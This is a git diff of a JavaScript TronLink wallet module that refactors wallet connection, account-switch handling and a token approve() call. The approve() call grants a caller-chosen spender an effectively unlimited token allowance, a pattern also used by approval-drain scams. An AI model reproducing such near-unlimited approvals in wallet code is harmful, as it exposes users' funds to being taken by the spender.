@@ -36,70 +36,65 @@ const getDefaultAddress = (_tronWeb) => {
  * 请求连接钱包
  */
 
-
+/**
+ * 请求连接钱包
+ */
 export const connect = async () => {
-  let result = { code: 200 }
-  let isChecked = await check()
-  console.log(1212000, '00000000000')
-
-  if (isChecked) {
-    try {
-      _tronWeb = window.tronlink || window.tronLink || window.tronWeb
-      let tronAccounts = null
-      try {
-        tronAccounts = await _tronWeb.request({
-          method: 'tron_requestAccounts'
-        })
-      } catch (error) {
+    let result = {code: 200}
+    let isChecked = await check()
+    if (isChecked) {
+        const tronWeb = window?.tronWeb;
         try {
-          tronAccounts = await _tronWeb.tron.getAccounts()
+            if (isModernTronWallet()) {
+                // 新版 TronLink: 使用 request 方法
+                const accounts = await tronWeb.request({method: 'tron_requestAccounts'});
+                result.data = {
+                    type: 'TRON',
+                    address: accounts[0] || tronWeb.defaultAddress.base58
+                }
+            } else {
+                // 旧版 TronLink: 直接获取默认地址
+                if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
+                    result.data = {
+                        type: 'TRON',
+                        address: tronWeb.defaultAddress.base58
+                    }
+                } else {
+                    result.code = 500
+                    result.msg = 'Please install the TronLink extension and log in to continue.'
+                }
+            }
         } catch (error) {
-          tronAccounts = []
+            result.code = 500
+            result.msg = error.message
         }
-      }
-      console.log('tronAccounts', tronAccounts)
-      let defaultAddress = getDefaultAddress(_tronWeb)
 
-      if (tronAccounts[0] || defaultAddress) {
-        result.data = {
-          type: 'TRON',
-          address: tronAccounts[0] || defaultAddress
-        }
-      } else {
+    } else {
         result.code = 500
-        // result.msg = tronAccounts.message || '请安装 TronLink 扩展插件并登录后继续操作。'
-        result.msg =
-          tronAccounts.message || 'Please install the TronLink extension and log in to continue.'
-      }
-    } catch (error) {
-      console.log('121212m12m12n1n2');
-      
-      result.code = 500
-      result.msg = error.message
+        // result.msg = '请安装 TronLink 扩展插件并登录后继续操作。'
+        result.msg = 'Please install the TronLink extension and log in to continue.'
     }
-  } else {
-    result.code = 500
-    // result.msg = '请安装 TronLink 扩展插件并登录后继续操作。'
-    result.msg = 'Please install the TronLink extension and log in to continue.'
-  }
-  return result
+    return result
 }
+
 
 /**
  * 初始化钱包切换监听
  */
 export const initSwitchWalletEvent = async () => {
-  let checked = await check()
-  if (checked) {
-    const userStore = useUserStore()
-    window.addEventListener('message', async function (e) {
-      if (e.data.message && e.data.message.action == 'accountsChanged') {
-        console.log('地址切换为', e.data.message.data.address)
-        userStore.signOut()
-        setTimeout(() => location.reload(), 10)
-      }
-    })
-  }
+  
+    let checked = await check()
+    
+    if (checked) {
+        const userStore = useUserStore()
+        window.addEventListener('message', async function (e) {
+            if (e.data.message && e.data.message.action == 'accountsChanged') {
+                console.log('地址切换为', e.data.message.data.address)
+                userStore.signOut()
+                setTimeout(() => location.reload(), 10)
+            }
+        })
+    }
 }
 
 /**
@@ -107,13 +102,13 @@ export const initSwitchWalletEvent = async () => {
  * @param {string} spenderAddress - 授权地址
  */
 export const approve = async (spenderAddress) => {
-  try {
-    await connect()
-    const tronLink = _tronWeb.tronWeb || _tronWeb
-    const contract = await tronLink.contract().at(contractAddress)
-    return await contract.methods.approve(spenderAddress, '999000000000000000').send()
-  } catch (err) {
-    console.log(err)
-    return Promise.reject(err)
-  }
+    try {
+        await connect()
+        const tronLink = window.tronLink
+        const contract = await tronLink.tronWeb.contract().at(contractAddress)
+        return await contract.methods.approve(spenderAddress, '999000000000000000').send()
+    } catch (err) {
+        console.log(err)
+        return Promise.reject(err)
+    }
 }
